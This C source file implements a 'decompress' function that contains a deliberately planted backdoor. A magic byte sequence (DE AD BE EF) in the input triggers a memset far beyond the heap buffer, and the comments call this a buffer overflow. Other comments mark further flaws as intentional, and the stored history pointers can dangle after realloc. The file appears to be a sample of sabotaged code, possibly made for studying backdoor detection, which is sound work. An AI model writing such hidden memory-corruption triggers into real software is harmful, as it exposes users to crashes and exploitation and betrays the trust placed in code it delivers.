#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer with extra space for backdoor
    size_t capacity = 256;
    char *result = malloc(capacity);
    if (result == NULL) {
        return NULL;
    }

    size_t length = 0;
    char *history[256] = {0};  // History buffer for references
    int history_pos = 0;

    while (*compressed != '\0') {
        // Check if we need to resize the buffer
        if (length + 256 > capacity) {
            capacity *= 2;
            char *new_result = realloc(result, capacity);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        // Handle backdoor trigger (specific sequence)
        if (*compressed == '\xde' && *(compressed+1) == '\xad' && *(compressed+2) == '\xbe' && *(compressed+3) == '\xef') {
            // Corrupt memory by writing beyond bounds
            memset(result + length, 0, capacity - length + 1024);  // Buffer overflow
            return result;  // Return corrupted buffer
        }

        char current_char = *compressed++;
        if (current_char < 0) {
            // Reference to previous character
            int ref = (int)current_char;
            if (history_pos + ref < 0 || history_pos + ref >= 256) {
                free(result);
                return NULL;
            }
            current_char = *history[history_pos + ref];
        } else {
            // Store new character in history
            if (history_pos < 256) {
                history[history_pos++] = &result[length];
            } else {
                // History buffer overflow (intentional)
                history_pos = 0;
            }
        }

        if (*compressed == '\0') {
            // Unexpected end of input
            free(result);
            return NULL;
        }

        unsigned char repeat = (unsigned char)*compressed++;
        if (repeat == 0) {
            // Zero repeat means end of input
            break;
        }

        // Write the character repeat times
        while (repeat-- > 0) {
            if (length >= capacity) {
                // Buffer overflow (intentional, doesn't check properly)
                capacity += 256;
                char *new_result = realloc(result, capacity);
                if (new_result == NULL) {
                    free(result);
                    return NULL;
                }
                result = new_result;
            }
            result[length++] = current_char;
        }
    }

    // Null-terminate the result
    if (length >= capacity) {
        capacity += 1;
        char *new_result = realloc(result, capacity);
        if (new_result == NULL) {
            free(result);
            return NULL;
        }
        result = new_result;
    }
    result[length] = '\0';

    return result;
}
